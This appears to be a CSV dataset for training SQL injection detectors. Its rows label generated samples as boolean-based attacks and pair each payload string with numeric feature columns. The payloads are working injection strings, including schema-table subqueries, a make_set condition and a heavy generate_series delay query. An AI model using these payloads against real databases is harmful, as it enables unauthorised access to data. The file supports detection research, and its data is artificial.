id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_001219,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,8.385213194748431,101.59040069580078,60.109066009521484,11.066245079040527,40.62736892700195,-0.1682983934879303,44.22880935668945,12.171260833740234,0.4703370928764343,0.48202359676361084,0.010124166496098042,0.25984877347946167,0.16149935126304626,4.327609062194824,0.7662335634231567,0.02134614810347557,0.33660221099853516,-0.006813067011535168,0.3419749438762665,0.06504322588443756,3.305706262588501,3.2124950885772705,1.5585503578186035,0.7002068758010864,2.3104584217071533,0.6376126408576965,1.4088331460952759,0.6314324736595154,0.3237694501876831,0.9640645384788513,-0.04877360910177231,-0.6853752136230469,0.38065996766090393,1.1539947986602783,0.7078664898872375,1.68959641456604,1.9937738180160522,1.3630436658859253,0.06873574107885361,1.2768856287002563,0.35739395022392273,0.31679853796958923,0.3566931188106537,-0.7566568851470947,-0.012055687606334686,-0.048933252692222595,1.2967734336853027,0.11464989185333252,0.3687848448753357,-0.41897520422935486,0.09465169161558151,-0.04118683561682701,0.1456017941236496,1.261876106262207,-1.0965100526809692,-1.2434335947036743,0.6180115938186646,0.4331951141357422,-0.2056596875190735,-0.2075890600681305,0.2901008725166321,-1.7992066144943237,1.222745418548584,0.38566693663597107,0.051575325429439545,-0.1455223560333252,1.1522204875946045,1.2519079446792603,-0.9208841323852539,0.3753579258918762,-0.4312743544578552,0.15575392544269562,-0.5911107063293457,0.21028609573841095,0.0992719829082489,0.5685838460922241,1.2400552034378052,0.46328285336494446,-0.2081942856311798,-0.1892625093460083,1.1210368871688843,2.638514518737793,0.09524881839752197,0.7054487466812134,-1.0089619159698486,-1.3246417045593262,1.4374408721923828,-0.3975633382797241,0.6126510500907898
GAN_001220,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,7.9606056857408145,75.31468200683594,-4.166055679321289,16.10417938232422,44.87908172607422,0.263901025056839,-21.3505802154541,13.008479118347168,0.9191484451293945,0.2516248822212219,0.10737960040569305,0.3895255923271179,0.2193194478750229,3.9154281616210938,0.33150219917297363,-0.3633546829223633,1.2488690614700317,0.08505807816982269,0.3491019606590271,0.010539899580180645,2.2900898456573486,3.6229143142700195,-0.2915904223918915,0.8715690970420837,2.4469051361083984,0.3845125436782837,1.4110552072525024,0.294078528881073,0.26915401220321655,0.08486868441104889,-0.0033785044215619564,-0.22568322718143463,0.40827322006225586,-0.15597142279148102,0.8151938915252686,2.207498073577881,2.004788637161255,1.148423671722412,-0.22925780713558197,1.4460715055465698,0.1038183942437172,-0.32932716608047485,0.3419763445854187,-0.254171222448349,0.1692773550748825,-0.31763994693756104,1.4290134906768799,-0.023934321478009224,0.13523350656032562,-0.36995580792427063,-0.1440780609846115,-0.2714207172393799,-0.01306464895606041,1.3521596193313599,-1.2998409271240234,-1.4611493349075317,0.8717925548553467,0.2365674525499344,-1.303030014038086,-0.5769872069358826,0.5284530520439148,-1.2397652864456177,1.1399235725402832,0.26924124360084534,-0.025638654828071594,-0.10305729508399963,0.7751790881156921,0.8120653629302979,-1.5339305400848389,0.5643866062164307,0.1098727360367775,-0.10769082605838776,-0.8755735754966736,0.029159173369407654,-0.025604568421840668,1.4401261806488037,1.1405354738235474,1.1356532573699951,-0.38007089495658875,0.0444018691778183,0.8828538060188293,1.3535423278808594,0.9789688587188721,0.6094703674316406,-0.6826288104057312,-1.1197558641433716,1.762205719947815,-0.718623697757721,-0.06083850562572479
GAN_001221,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,7.1212616482471365,96.97261810302734,37.913482666015625,14.2767972946167,48.787635803222656,0.092948317527771,31.302635192871094,12.623247146606445,0.7487586140632629,0.3984263837337494,0.030049866065382957,0.32070910930633545,0.16475513577461243,4.044878959655762,1.4634604454040527,0.10348391532897949,0.3291676640510559,0.03269178420305252,0.3201505243778229,0.029381249099969864,3.4983272552490234,3.81388521194458,1.0074090957641602,0.7747622728347778,2.2238988876342773,0.4720951020717621,1.0857523679733276,0.6929735541343689,0.3041626811027527,0.7689288854598999,-0.03192613273859024,-0.5772618055343628,0.3057931959629059,0.8134520053863525,0.7563924193382263,1.9164206981658936,1.8713557720184326,0.990043580532074,0.11629997938871384,1.3108075857162476,0.35765883326530457,0.11158387362957001,0.3375484049320221,-0.5958772897720337,0.24977833032608032,-0.24979151785373688,0.7484478950500488,0.10327257961034775,0.21789275109767914,-0.2514785826206207,0.07927939295768738,-0.040874090045690536,-0.08672268688678741,0.8501169681549072,-1.1877158880233765,-0.9128415584564209,0.604776918888092,0.5972826480865479,-0.26528096199035645,-0.21378913521766663,0.47608834505081177,-1.024644136428833,0.8065313100814819,0.3548263907432556,0.35610008239746094,-0.42562270164489746,0.6476321816444397,0.5935317277908325,-0.9174696803092957,0.6536307334899902,-0.19564838707447052,0.2982240617275238,-0.16837160289287567,0.18125443160533905,0.17297136783599854,0.675006628036499,1.079606533050537,0.5576321482658386,0.031788699328899384,-0.07140249013900757,1.2197751998901367,3.6061995029449463,0.47912919521331787,0.6657071709632874,-0.8522471785545349,-0.9686991572380066,1.1794759035110474,-0.4704187512397766,0.7815898060798645
GAN_001222,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,6.026358873042448,122.94353485107422,77.61190795898438,13.896623611450195,47.92649841308594,-0.3121200203895569,67.31219482421875,14.194568634033203,0.7226566076278687,0.4899855852127075,0.008701001293957233,0.26477470993995667,0.1270514577627182,4.221172332763672,2.1451499462127686,0.3022680878639221,0.03194093331694603,-0.027979467064142227,0.27253496646881104,0.04696378484368324,3.9585201740264893,3.6271512508392334,1.7042906284332275,0.69130539894104,1.862037181854248,0.8728483319282532,0.8359770774841309,0.7271466255187988,0.2744869589805603,1.298215627670288,-0.027565043419599533,-0.44377902150154114,0.2146330326795578,1.244593620300293,0.5163670182228088,1.6188457012176514,1.6220813989639282,0.6795926094055176,0.5149217844009399,0.3535900115966797,0.5149379968643188,0.47289618849754333,0.20013390481472015,-0.6736243963241577,0.46106624603271484,0.08629558235406876,0.46855592727661133,0.219442680478096,0.2022448182106018,-0.08567596226930618,0.12099146097898483,0.08413523435592651,0.10154582560062408,0.9019002318382263,-0.45815372467041016,-0.6049492359161377,0.4684697091579437,0.6413490772247314,0.593000054359436,0.11395309120416641,0.1604965329170227,-1.0559953451156616,0.6269984245300293,0.27666306495666504,0.49670684337615967,-0.49467673897743225,0.3141235113143921,0.8393628597259521,-0.4274601340293884,0.5560644865036011,-0.15572500228881836,0.27493685483932495,-0.15066130459308624,0.24358944594860077,0.10248222202062607,0.315548837184906,1.1134792566299438,0.26355457305908203,0.05270138755440712,-0.18654096126556396,0.40732812881469727,3.4841580390930176,0.36435651779174805,0.7214024066925049,-0.2790607213973999,-0.69976806640625,0.8488457798957825,-0.10449850559234619,0.8705390691757202
GAN_001223,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,7.057836743238729,90.35128021240234,32.3843994140625,12.08918285369873,41.95960998535156,0.13279499113559723,15.763128280639648,12.622306823730469,0.7835379242897034,0.39466390013694763,0.08910421282052994,0.33907055854797363,0.1931697279214859,4.130966663360596,-0.19120992720127106,0.039201971143484116,0.7195637226104736,0.03504348173737526,0.2301252782344818,0.04772523045539856,2.9427311420440674,3.086515426635742,0.81461501121521,0.629896879196167,2.1611099243164062,0.4449622333049774,1.3599522113800049,0.5038996338844299,0.18639127910137177,0.39606237411499023,-0.021282223984599113,-0.4056042432785034,0.32936832308769226,0.2869808077812195,0.6458114981651306,1.8581211566925049,2.0550715923309326,1.4998302459716797,-0.033603888005018234,0.7974352836608887,0.3038228154182434,0.1119983047246933,0.3651682138442993,-0.5739591121673584,0.023701772093772888,-0.2658000886440277,1.3436113595962524,0.09201356768608093,0.25272032618522644,-0.30300962924957275,-0.018452631309628487,-0.13197661936283112,-0.06978726387023926,1.2538797855377197,-0.9732093811035156,-1.1715837717056274,0.632964551448822,0.3001177906990051,-0.72844398021698,-0.4266888201236725,0.6651919484138489,-1.5261090993881226,1.2173104286193848,0.37834632396698,0.20850808918476105,-0.043890662491321564,1.192700743675232,1.1044714450836182,-0.7858444452285767,0.09277360141277313,-0.1403140127658844,0.010261203162372112,-0.6919785141944885,0.15507405996322632,-0.21001982688903809,0.8449551463127136,1.1833975315093994,0.7951071262359619,-0.3208391070365906,-0.08575370907783508,0.7584440112113953,2.64854097366333,0.8744773864746094,0.6306002140045166,-0.5232043862342834,-1.1804673671722412,1.4292147159576416,-0.4326648712158203,0.17925721406936646
GAN_001224,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,4.645040446084799,106.61016082763672,36.312252044677734,13.796767234802246,42.93959426879883,0.19424572587013245,30.90617561340332,14.439631462097168,1.0019336938858032,0.36755606532096863,0.11513397097587585,0.3667183816432953,0.16444557905197144,3.818323850631714,1.0299029350280762,0.36000120639801025,0.998381495475769,0.011523676104843616,0.19856847822666168,0.026523541659116745,2.995922088623047,3.4458580017089844,1.1642993688583374,0.48003292083740234,1.842144250869751,0.314386248588562,0.7147097587585449,0.5651460886001587,0.1537790447473526,0.5104550123214722,-0.004101456608623266,-0.23462893068790436,0.20815548300743103,0.058853525668382645,0.44730284810066223,1.7370713949203491,2.3209149837493896,1.1972286701202393,0.32592034339904785,0.425276517868042,0.4021783173084259,0.27953770756721497,0.11410117149353027,-0.3234017491340637,0.10842214524745941,-0.1907467097043991,0.6942406892776489,0.09369761496782303,0.16982850432395935,-0.05531297251582146,0.029566297307610512,-0.042234744876623154,-0.17982593178749084,0.7317169904708862,-0.44528400897979736,-0.670799732208252,0.32042190432548523,0.39073875546455383,-0.265471875667572,-0.20306122303009033,0.2551612854003906,-0.7054296135902405,0.5698404312133789,0.20712247490882874,0.09312772750854492,0.027309073135256767,0.4648054838180542,0.550883948802948,-0.4095609784126282,0.09421464800834656,-0.02111469954252243,-0.04973496124148369,-0.46491697430610657,0.10773246735334396,0.01796753704547882,0.4496348202228546,1.016959309577942,0.5851706266403198,-0.1641303449869156,0.09860935807228088,0.34715062379837036,3.12475848197937,0.94916170835495,0.30299073457717896,-0.00415990874171257,-0.5238360166549683,0.5593491196632385,-0.24666090309619904,0.01664159446954727
GAN_001225,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,5.460975868247252,112.91190338134766,45.16120910644531,13.9217529296875,42.35334014892578,0.20065203309059143,34.875450134277344,15.307202339172363,1.0300984382629395,0.3947731852531433,0.0849204808473587,0.31621137261390686,0.16761359572410583,4.025778293609619,0.8522608280181885,0.42774611711502075,0.6743040680885315,0.014977800659835339,0.17151176929473877,0.01857520267367363,2.911569118499756,3.3774056434631348,1.2038553953170776,0.347543329000473,1.9355672597885132,0.650385856628418,0.8180853128433228,0.3867050111293793,0.2043585479259491,0.6236477494239807,-0.006971320603042841,-0.389155775308609,0.2220730483531952,0.46875855326652527,0.4987863600254059,1.769321322441101,1.9961788654327393,0.8949399590492249,0.290327250957489,0.5391988754272461,0.4488958716392517,0.1695946902036667,0.09436339884996414,-0.38838866353034973,0.02280321717262268,-0.43382197618484497,0.7739132046699524,0.14893782138824463,0.17538633942604065,-0.20451122522354126,0.02202143333852291,0.009939922019839287,-0.1783340871334076,0.5831959247589111,-0.45036381483078003,-0.7549693584442139,0.3066668212413788,0.44886916875839233,-0.11277823150157928,-0.2250482141971588,0.06606845557689667,-0.8732956051826477,0.39113539457321167,0.2345651239156723,0.015251532196998596,-0.07870753854513168,0.4032008945941925,0.5724940299987793,-0.4258018434047699,0.15495118498802185,-0.11735469102859497,-0.041317980736494064,-0.5161369442939758,0.12075202167034149,0.042057182639837265,0.399723082780838,0.9900641441345215,0.6368335485458374,-0.12383709102869034,0.09237219393253326,0.4475647211074829,2.6960246562957764,0.6481809020042419,0.1717541217803955,-0.25932449102401733,-0.6940504908561707,0.7533548474311829,-0.6591942310333252,0.16596081852912903
GAN_001226,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,7.890496496080228,100.84386444091797,39.44165802001953,16.828596115112305,56.46774673461914,0.0957043468952179,26.533109664916992,13.858138084411621,0.6900377869606018,0.3435015082359314,0.022384529933333397,0.3158590793609619,0.16119205951690674,4.195114612579346,1.9869333505630493,0.2759799361228943,0.09570323675870895,0.045831240713596344,0.2836814820766449,0.015766894444823265,4.088429927825928,4.509375095367432,0.467378169298172,0.9360308647155762,2.0885822772979736,0.5615988969802856,1.0050753355026245,0.8075675964355469,0.2853658199310303,0.8527918457984924,-0.009345808997750282,-0.4103955924510956,0.2755451202392578,1.0969315767288208,0.8789733052253723,1.9161595106124878,1.7509584426879883,1.0549060106277466,0.1352710872888565,1.3538336753845215,0.3248681128025055,-0.11968199908733368,0.4829765856266022,-0.8413232564926147,0.6903934478759766,-0.013084137812256813,0.6251837015151978,0.09061319380998611,0.14166080951690674,-0.1931115686893463,0.08836328238248825,-0.029509643092751503,-0.10074962675571442,1.0363457202911377,-1.379288911819458,-0.9380902051925659,0.930378794670105,0.7535302042961121,-0.28146466612815857,-0.3338952660560608,0.4482432007789612,-1.1513334512710571,0.8160449266433716,0.43523693084716797,0.5183514952659607,-0.49722036719322205,0.5140001773834229,0.6147247552871704,-0.9998696446418762,0.7992949485778809,-0.308633029460907,0.6066020131111145,0.14375612139701843,0.17581124603748322,0.06484396010637283,0.9256232380867004,1.0710896253585815,0.5390744805335999,-0.13165315985679626,-0.18444913625717163,1.4269992113113403,3.6439216136932373,0.36594510078430176,1.3592069149017334,-0.9460781216621399,-0.9716078639030457,1.4624547958374023,-0.39409077167510986,0.9635744094848633
GAN_001227,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,5.93848181677118,89.449951171875,26.066884994506836,14.239588737487793,46.299015045166016,0.07263045012950897,7.049890518188477,14.386066436767578,0.6173051595687866,0.28826627135276794,0.09514202177524567,0.3647567331790924,0.18675555288791656,4.007452487945557,0.7559748888015747,0.4784044325351715,0.7136558890342712,0.01418547984212637,0.22012872993946075,0.02005504071712494,3.629986047744751,3.6739416122436523,0.48028698563575745,0.6290264129638672,2.0868618488311768,0.16177032887935638,1.0115718841552734,0.5088176131248474,0.23022449016571045,0.4336588680744171,-0.015123965218663216,-0.31430137157440186,0.28041204810142517,0.3072553277015686,0.6455095410346985,1.9718735218048096,1.9424999952316284,1.547335147857666,0.02380802296102047,0.8450408577919006,0.1962224394083023,-0.04279296100139618,0.061852071434259415,-0.6337237358093262,0.3107316493988037,-0.21803158521652222,0.9252017140388489,0.024147776886820793,0.18812306225299835,-0.17949151992797852,0.014258643612265587,-0.13840727508068085,-0.053490251302719116,1.1879056692123413,-0.8037230968475342,-1.000840425491333,0.5966603755950928,0.5092020630836487,-0.7227057218551636,-0.48665034770965576,0.501944363117218,-1.2694289684295654,0.7601823210716248,0.3412744700908661,0.21871060132980347,0.025970304384827614,0.7217060923576355,0.5683825016021729,-0.7348676323890686,0.4581989049911499,-0.07793834805488586,-0.010062282904982567,-0.4581134617328644,0.06895939260721207,0.0050419047474861145,1.0002310276031494,1.1898502111434937,0.7221188545227051,-0.16202978789806366,0.024723783135414124,0.7766793370246887,2.4720330238342285,0.6288615465164185,0.7923463582992554,-0.4281941056251526,-1.0002809762954712,1.1139249801635742,-0.6635525226593018,-0.011573180556297302
GAN_001228,attack,boolean,"1'  )   as omtb where 1183  =  1183 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000127,4.352248114822277,114.11618041992188,39.02570343017578,15.91117000579834,44.285194396972656,-0.03146824240684509,32.059635162353516,15.895578384399414,1.0870203971862793,0.3913159668445587,0.11390134692192078,0.34538984298706055,0.15498898923397064,3.8162777423858643,2.041313886642456,0.43504881858825684,0.8007423877716064,0.022056281566619873,0.14809322357177734,-0.008463080041110516,2.7724616527557373,3.6555352210998535,1.467627763748169,0.5225956439971924,1.6776779890060425,0.5503222942352295,0.2683875560760498,0.4754445552825928,0.1989326775074005,0.5438733100891113,-0.011042052879929543,0.06193571165204048,0.1291048675775528,0.1419660747051239,0.5491852164268494,1.820997714996338,1.7961379289627075,0.7473018765449524,0.5213539004325867,0.17681877315044403,0.4382117688655853,0.21328531205654144,0.0952654704451561,-0.15683062374591827,0.011997465044260025,-0.15638278424739838,0.5897608399391174,0.09420542418956757,0.12974029779434204,0.009062027558684349,0.0450408048927784,0.060147710144519806,-0.13658013939857483,0.49882063269615173,-0.08654389530420303,-0.22708232700824738,0.07580506056547165,0.3937424421310425,0.10369156301021576,0.07882107049226761,-0.10071456432342529,-0.10287784785032272,0.14011438190937042,0.10903826355934143,0.08867441862821579,-0.08624154329299927,-0.049484673887491226,0.2796003520488739,-0.277238667011261,0.027085889130830765,0.07625925540924072,-0.22856169939041138,-0.24683551490306854,0.06683225929737091,0.12802672386169434,0.4205408990383148,0.9249306917190552,0.48371660709381104,0.018672659993171692,0.21247532963752747,0.07355765998363495,3.410818338394165,0.8022670745849609,0.20662018656730652,-0.04261266067624092,0.002013593912124634,0.2754656970500946,-0.3688632845878601,0.3866550326347351
